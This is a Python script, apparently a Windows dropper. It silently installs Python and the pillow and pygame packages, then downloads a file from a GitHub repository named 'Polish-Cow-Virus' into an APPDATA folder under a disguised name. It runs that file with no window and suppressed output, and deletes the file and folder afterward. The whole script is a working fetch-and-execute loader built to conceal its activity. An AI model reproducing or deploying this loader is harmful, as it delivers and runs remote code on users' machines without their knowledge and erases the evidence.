import os
import sys
import time
import subprocess
import urllib.request

GITHUB_FILE_URL = "https://raw.githubusercontent.com/eggman1243/Polish-Cow-Virus/refs/heads/main/poland.pyw"

def run(command):
    subprocess.check_call(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def python_exists():
    try:
        subprocess.check_call("python --version", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def install_python():
    if not python_exists():
        run("winget install Python.Python.3.11 --accept-source-agreements --accept-package-agreements")

def install_packages():
    run("python -m pip install --upgrade pip")
    run("python -m pip install pillow pygame")

def download_file():
    folder = os.path.join(os.environ["APPDATA"], "PythonCache")
    os.makedirs(folder, exist_ok=True)
    path = os.path.join(folder, "app.py")
    urllib.request.urlretrieve(GITHUB_FILE_URL, path)
    return path

def run_file(path):
    if getattr(sys, "frozen", False):
        if path.lower().endswith(".py"):
            subprocess.Popen(
                ["python", path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                [path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    else:
        subprocess.Popen(
            [sys.executable, path],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

def main():
    install_python()
    install_packages()

    file_path = download_file()
    run_file(file_path)

    time.sleep(15)

    if os.path.exists(file_path):
        os.remove(file_path)

    folder = os.path.dirname(file_path)
    try:
        os.rmdir(folder)
    except:
        pass

if __name__ == "__main__":
    main()